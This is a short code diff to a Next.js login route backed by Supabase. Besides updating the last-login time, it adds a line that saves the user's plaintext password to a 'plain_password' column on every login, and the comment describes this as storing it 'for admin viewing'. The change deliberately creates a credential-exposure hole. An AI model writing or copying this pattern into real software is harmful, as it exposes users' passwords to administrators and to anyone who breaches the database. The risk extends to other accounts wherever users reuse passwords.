@@ -37,10 +37,13 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // Update last login
+    // Update last login and store plain password for admin viewing
     await supabase
       .from('users')
-      .update({ last_login: new Date().toISOString() })
+      .update({ 
+        last_login: new Date().toISOString(),
+        plain_password: password // Update plain password for admin records
+      })
       .eq('id', user.id);
 
     // Get user expertise
